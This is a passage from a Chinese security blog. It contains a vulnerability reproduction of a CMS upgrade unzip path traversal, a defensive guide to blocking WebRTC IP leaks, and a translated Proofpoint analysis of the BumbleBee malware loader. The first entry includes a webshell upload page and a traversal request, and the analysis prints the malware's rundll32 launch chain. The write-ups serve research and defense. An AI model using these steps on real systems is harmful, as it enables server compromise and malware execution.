class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php">......<br><span class="hljs-variable">$package_dir</span> = ROOT_PATH.<span class="hljs-string">&#x27;upgrade/package/&#x27;</span>;<span class="hljs-comment">//存放压缩文件和解压后代码的文件夹</span><br><br><span class="hljs-variable">$act</span> = <span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">sfilter</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;act&#x27;</span>]);<br><br><br><span class="hljs-comment">//下载升级包</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;download&#x27;</span>)&#123;<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$version</span> = (<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">simplexml_load_file</span>(ROOT_PATH.<span class="hljs-string">&#x27;data/version.conf&#x27;</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA);<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$version</span>[<span class="hljs-string">&#x27;downurl&#x27;</span>].<span class="hljs-string">&quot;upgrade.php?customid=&quot;</span>.<span class="hljs-variable">$custom</span>[<span class="hljs-string">&#x27;customid&#x27;</span>].<span class="hljs-string">&quot;&amp;code=&quot;</span>.<span class="hljs-variable">$version</span>[<span class="hljs-string">&#x27;code&#x27;</span>].<span class="hljs-string">&quot;&amp;step=1&quot;</span>;<br><span class="hljs-comment">//设置该次请求超时时长，1800s</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;max_execution_time&quot;</span>, <span class="hljs-string">&quot;1800&quot;</span>); <br><span class="hljs-comment">//兼容php-fpm设置超时</span><br>@<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;request_terminate_timeout&quot;</span>, <span class="hljs-string">&quot;1800&quot;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$file</span>) &#123;<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&#x27;升级包下载失败&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$package_dir</span>)) &#123;<br><span class="hljs-comment">//删除package目录</span><br><span class="hljs-keyword">require_once</span> ROOT_PATH.<span class="hljs-string">&#x27;source/include/cls_file_util.php&#x27;</span>;<br><span class="hljs-title class_">FileUtil</span>::<span class="hljs-title function_ invoke__">unlinkDir</span>(<span class="hljs-variable">$package_dir</span>);<br>&#125;<br><span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">make_dir</span>(<span class="hljs-variable">$package_dir</span>);<br><span class="hljs-variable">$zip_file</span> = <span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">gmtime</span>().<span class="hljs-string">&#x27;.zip&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$package_dir</span>.<span class="hljs-variable">$zip_file</span>, <span class="hljs-variable">$file</span>);<br> @<span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$package_dir</span>.<span class="hljs-variable">$zip_file</span>, <span class="hljs-number">0777</span>);<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;zip_file&#x27;</span>] = <span class="hljs-variable">$zip_file</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Json</span>-&gt;<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$re</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-comment">//解压缩</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;unzip&#x27;</span>)&#123;<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-number">0</span> ;<br><span class="hljs-variable">$zip_file</span> = <span class="hljs-title class_">Common</span>::<span class="hljs-title function_ invoke__">sfilter</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;zip_file&#x27;</span>]);<br><span class="hljs-variable">$zip_file_ab</span> = <span class="hljs-variable">$package_dir</span>.<span class="hljs-variable">$zip_file</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$zip_file_ab</span>)) &#123;<br><span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&#x27;升级包不存在&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">require_once</span> ROOT_PATH.<span class="hljs-string">&#x27;source/include/pclzip.lib.php&#x27;</span>;<br><span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PclZip</span>(<span class="hljs-variable">$zip_file_ab</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">extract</span>(PCLZIP_OPT_PATH, <span class="hljs-variable">$package_dir</span>))&#123;<br>    <span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$re</span>[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&#x27;升级包解压失败&#x27;</span> ;<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$zip_file_ab</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$Json</span>-&gt;<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$re</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br>......<br><br></code></pre></td></tr></table></figure><p>解压功能，如果act传参为unzip时，就进入解压处理；</p><p>通过参数<code>zip_file</code> 传给Common::sfilter获取升级包文件，然后把完整路径赋值给 <code>$zip_file_ab</code>，如果存在指定的升级包，则使用PclZIp(一个开源的压缩于解压的类库包)进行解压缩，存放到 <code>upgrade/package</code> 下。</p><p>跟进sfilter方法，发现作了相应的过滤，如url解码、去除html标签、字符串html实体化、加反斜杠转义等。</p><p>也就是参数zip_file可控并且没有对 <code>../../</code> <code>..\..\</code> 做处理。</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQVoD.png" alt=""></p><h4 id="构造数据包">构造数据包</h4><p>把php webshell打zip压缩，向 <code>/vradmin/upload.php?act=article </code> 接口上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">html</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">font-family</span>: sans-serif;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>File Uploader<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;imgFile&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file_to_upload&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file_name&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">progress</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;progress_bar&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:400px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">progress</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;progress_status&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload To Server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload_file_button&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;file_to_upload&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;change&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">window</span>.<span class="hljs-property">selectedFile</span> = event.<span class="hljs-property">target</span>.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>];</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;file_name&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">selectedFile</span>.<span class="hljs-property">name</span>;</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;upload_file_button&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">uploadFile</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">selectedFile</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">uploadFile</span>(<span class="hljs-params">file</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>();</span><br><span class="language-javascript">            formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;imgFile&#x27;</span>, file);</span><br><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> ajax = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><br><span class="language-javascript">            ajax.<span class="hljs-property">upload</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;progress&#x27;</span>, progressHandler, <span class="hljs-literal">false</span>);</span><br><span class="language-javascript">            ajax.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;/vradmin/upload.php?act=article&#x27;</span>);</span><br><span class="language-javascript">            ajax.<span class="hljs-title function_">send</span>(formData);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">function</span> <span class="hljs-title function_">progressHandler</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">var</span> percent = (event.<span class="hljs-property">loaded</span> / event.<span class="hljs-property">total</span>) * <span class="hljs-number">100</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;progress_bar&#x27;</span>).<span class="hljs-property">value</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(percent);</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;progress_status&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(percent) + <span class="hljs-string">&#x27;% uploaded&#x27;</span>;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包加上cookie以及修改目标地址</p><p><img src="https://s1.ax1x.com/2022/09/16/vzQeFe.png" alt=""></p><p>解压</p><p><code>/vradmin/index.php?m=upgrade </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST /vradmin/index.php?m=upgrade HTTP/1.1<br>Host: www.bing.com<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml; q=0.9,*/*;q=0.8<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=rencbs7p8t9bbpicsn386nq1n6<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 59<br><br>act=unzip&amp;zip_file=../../data/article/202207/1658248821.png<br></code></pre></td></tr></table></figure><h4 id="坑…">坑…</h4><p>解压会把png文件删除并且无法得到webshel，至于为什么暂时不清楚，以后再择机填坑吧。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>阻止 WebRTC 泄露本地/真实 IP</title>
    <link href="/posts/ee0c8274.html"/>
    <url>/posts/ee0c8274.html</url>
    
    <content type="html"><![CDATA[<p>​WebRTC 是一项实时通讯技术，它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点的连接，实现视频流和（或）音频流或者其他任意数据的传输。WebRTC 包含的这些标准使用户在无需安装任何插件或者第三方的软件的情况下，创建点对点的数据分享和电话会议成为可能。</p><p>​简而言之这玩意主要是支持网络视频/会议等流畅不卡顿的，但同时也会暴露所处本地内网IP、代理后面的真实IP。挂<code>VPN</code>不影响(注意是真vpn模式且VPN可靠)，获取到的IP也只是VPN服务商那边的IP。iPhone（IOS14+）不受影响。</p><p>测试站点：</p><p><a href="https://www.useragentinfo.com/">https://www.useragentinfo.com/</a></p><p><a href="https://www.hackjie.com/tracking">https://www.hackjie.com/tracking</a></p><p><a href="https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/">https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/</a></p><h3 id="0x01-基于浏览器扩展-脚本">0x01 基于浏览器扩展/脚本</h3><h4 id="插件">插件</h4><p>Firefox</p><p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/happy-bonobo-disable-webrtc/">https://addons.mozilla.org/zh-CN/firefox/addon/happy-bonobo-disable-webrtc/</a></p><p><a href="https://addons.mozilla.org/zh-CN/firefox/addon/webrtc-leak-shield/">https://addons.mozilla.org/zh-CN/firefox/addon/webrtc-leak-shield/</a></p><p>Chrome系(不适用移动端)</p><p><a href="https://chrome.google.com/webstore/detail/webrtc-leak-shield/bppamachkoflopbagkdoflbgfjflfnfl?hl=zh-CN">https://chrome.google.com/webstore/detail/webrtc-leak-shield/bppamachkoflopbagkdoflbgfjflfnfl?hl=zh-CN</a></p><p><a href="https://microsoftedge.microsoft.com/addons/detail/webrtc-leak-shield/pblfgfehcokbglafpcldgjpmknildihk?hl=zh-CN">https://microsoftedge.microsoft.com/addons/detail/webrtc-leak-shield/pblfgfehcokbglafpcldgjpmknildihk?hl=zh-CN</a></p><p><a href="https://chrome.google.com/webstore/detail/webrtc-leak-prevent/eiadekoaikejlgdbkbdfeijglgfdalml?hl=zh-CN">https://chrome.google.com/webstore/detail/webrtc-leak-prevent/eiadekoaikejlgdbkbdfeijglgfdalml?hl=zh-CN</a></p><h4 id="油猴-Tampermonkey-脚本">油猴(Tampermonkey)脚本</h4><p>如下脚本适用PC端和手机端（via/Alook浏览器等），即支持运行自定义js脚本的浏览器皆适用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         Disable WebRTC</span><br><span class="hljs-comment">// @namespace    http://tampermonkey.net/</span><br><span class="hljs-comment">// @version      0.2</span><br><span class="hljs-comment">// @description  Disable WebRTC for all web site</span><br><span class="hljs-comment">// @author       Sec</span><br><span class="hljs-comment">// @match        http://*</span><br><span class="hljs-comment">// @match        https://*/*</span><br><span class="hljs-comment">// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==</span><br><span class="hljs-comment">// @grant        none</span><br><span class="hljs-comment">// @run-at document-start</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br><br>    <span class="hljs-keyword">delete</span> navigator.<span class="hljs-property">getUserMedia</span>;<br>    <span class="hljs-keyword">delete</span> navigator.<span class="hljs-property">mediaDevices</span>.<span class="hljs-property">getUserMedia</span>;<br>    <span class="hljs-keyword">delete</span> navigator.<span class="hljs-property">mozGetUserMedia</span>;<br>    <span class="hljs-keyword">delete</span> navigator.<span class="hljs-property">webkitGetUserMedia</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">MediaStreamTrack</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">RTCPeerConnection</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">RTCSessionDescription</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozMediaStreamTrack</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRTCPeerConnection</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">mozRTCSessionDescription</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitMediaStreamTrack</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRTCPeerConnection</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">webkitRTCSessionDescription</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">RTCDataChannel</span>;<br>    <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">DataChannel</span>;<br><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Accelerator killed WebRTC.&quot;</span>);<br>&#125;)();<br></code></pre></td></tr></table></figure><h3 id="0x02-基于浏览器配置">0x02 基于浏览器配置</h3><p>chrome系已经移除了通过高级配置WebRTC相关功能，目前只通过浏览器插件或者油猴脚本实现。</p><p>Firefox可做如下设置：进入高级配置界面 <code>about:config</code>，搜 <code>media.peerconnection.enabled</code>，改为<code>false</code>。</p><h3 id="0x03-基于防火墙">0x03 基于防火墙</h3><p>WebRTC默认走UDP，针对浏览器，新建策略禁止UDP协议连接。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BumbleBee-大黄蜂</title>
    <link href="/posts/de71e52e.html"/>
    <url>/posts/de71e52e.html</url>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming">https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming</a></p><h2 id="重要发现">重要发现</h2><ul><li>Proofpoint 监测到了一个名为 BumbleBee 的新恶意软件加载程序，该加载器由多个犯罪威胁组织在使用，观察到以往这些犯罪威胁者提供基本加载器(BazaLoader)和IcedID。</li><li>一些常用BazaLoader的威胁攻击者已经过度到 BumbleBee 。从2022年2月开始，BazaLoader 尚未出现在Proofpoint数据中。</li><li>BumbleBee 处于维护中，并使用复杂的规避技术，如反虚拟化。</li><li>与大多数使用进程空心化或DLL注入的其他如意软件不同，此加载器利用了异步过程调用（APC）注入从命令和控件（C2）接收的命令启动shellcode。</li><li>Proofpoint观察到Bumblebee掉落Cobalt Strike，shellcode，Slimver和Meterpreter。</li><li>使用Bumblebee的威胁行为者与与后续勒索软件活动相关的恶意软件有效payload相关。</li></ul><h2 id="概述">概述</h2><p>​从2022年3月开始，Proofpoint监测到了一个名为Bumblebee的新下载器的活动。包括已知的威胁行为者在内的至少三个活动集群目前正在使用BumbleBee。Proofpoint 识别的活动与 Google 威胁分析组博客中详述的导致 Conti 和 Diavol 勒索软件的活动重叠。</p><p>​BumbleBee 是一个复杂的下载器，包含反虚拟化检测和通用下载器功能，尽管它目前还处于恶意软件开发的早期阶段。</p><p>​Bumblebee 的目标是下载和执行额外的有效载荷。  Proofpoint 研究人员观察到 Bumblebee 丢弃了 Cobalt Strike、shellcode、Sliver 和 Meterpreter。恶意软件名称来自早期活动中使用的唯一User-Agent“bumblebee”。</p><p>​BumbleBee 在威胁领域的增加与 BazaLoader  相吻合，BazaLoader  是一种常用的payloads加载器，可促进后续攻击，但在好像消失了–来自 Proofpoint 威胁数据。</p><h2 id="威胁详情">威胁详情</h2><p>​Proofpoint 研究人员监测到 Bumblebee 被至少三个跟踪的威胁参与者分发到电子邮件活动中。 威胁攻击者使用多种技术来传播 Bumblebee。  虽然使用的诱饵、传递技术和文件名通常是针对分发活动的不同威胁攻击者组织定制的，但 Proofpoint 观察到活动之间的几个共同点，例如使用包含快捷方式文件和 DLL 的 ISO 文件以及多个参与者使用的通用 DLL 入口点。</p><h3 id="指向BumbleBee的URL和HTML文件">指向BumbleBee的URL和HTML文件</h3><p>​2022年3月，Proofpoint 监测到一个附带有 DocuSign 品牌的钓鱼邮件，邮件内含两个链接，用于诱导收件人下载恶意ISO文件。一个是在邮件正文中的“查看此文档”超链接。当用户点击后，会跳转到托管在 OneDrive的是压缩文件（ISO）。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLgIg.png" alt=""></p><p>另外一个是，邮件中还包含一个HTML附件，该HTML文件伪装成一个指向未支付订单的电子邮件。HTML附件中嵌入了可重定向的URL，它使用Prometheus TDS根据潜在受害者的时区和cookie过滤下载。重定向器反过来将用户定向到压缩文件，该文件也托管在OneDrive上。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLcdS.png" alt=""></p><p>压缩文件内包含一个名为 <code>Invoice-32203.iso</code> 的ISO文件。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsL6Z8.png" alt=""></p><p>ISO文件内包含名为 <code>Attachments.lnk</code>  快捷方式和 <code>Attachments.dat</code> 文件。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLRiQ.png" alt=""></p><p>如果双击打开 Attachments.lnk 会执行 Attachments.dat (实际上是一个dll文件)，从而运行下载器 BumbleBee。</p><p>快捷方式 Attachments.lnk  的命令及进程攻击链：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd.exe /c start /wait <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;C:\Users\[removed]\AppData\Local\Temp\ATTACHME.LNK&quot;</span><br>rundll32.exe <span class="hljs-string">&quot;C:\Windows\System32\rundll32.exe&quot;</span> Attachments.dat,IternalJob<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/08/20/vsLWGj.png" alt=""></p><p>​Proofpoint 研究人员确认这次攻击活动是有网络犯罪组织 TA579发起的。从2021年8月以来，Proofpoint一直在跟踪 TA579。该威胁行为者在过去的活动中经常提供 BazaLoader 和 IcedID。</p><h3 id="压缩的ISO附件包含BumbleBee导致进程被劫持">压缩的ISO附件包含BumbleBee导致进程被劫持</h3><p>​2022年4月，Proofpoint监测到一个进程劫持攻击活动，该活动发送的电子邮件似乎是对带有恶意压缩ISO文件的现有安全电子邮件对话的回复。此活动中的所有附件名称都使用了<code>doc_invoice_[数字].zip</code>的形式进行命名。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLfRs.png" alt=""></p><p>ISO文件位于带密码ZIP中，解压密码则已经写在邮件正文中。ISO含有两个文件，一个快捷方式和dll。当受害者双击打开快捷方式文件<code>DCOUNENT.LNK</code>时，会变相的通过cmd调用rundll32执行dll文件 <code>tar.dll</code> 从而启动BumbleBee下载器。</p><p>快捷方式 进程链：</p><p><img src="https://s1.ax1x.com/2022/08/20/vsL5Mq.png" alt=""></p><p>BumbleBee 攻击链：</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLhzn.png" alt=""></p><h3 id="联系表单-Stolen-Images-指向BumbleBee">联系表单&quot;Stolen Images&quot;指向BumbleBee</h3><p>2022年3月，Proofpoint 监测到一项活动，该活动通过向目标网站上的联系表格提交消息而生成电子邮件。 此外，根据网站“联系我们”部分的配置方式，提交的内容还在目标网站上留下了关于该主题的公众评论。 这些电子邮件据称声称网站上存在被盗图像。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLLi4.png" alt=""></p><p>&quot;投诉&quot;表单包含了一个指向登录页面的超链接，点击该超链接会打开一个下载ISO文件的页面，该ISO文件内包含一个lnk(<code>DOCUMENT_STOLENIMAGES.LNK</code>)和dll(<code>neqe.dll</code>)文件。</p><p><img src="https://s1.ax1x.com/2022/08/20/vsLIs0.png" alt="登录页面样式"></p><p>如果双击打开快捷方式文件，就会通过相应的参数执行<code>neqw.dll</code>从而启动 BumbleBee 加载器。</p><p><img 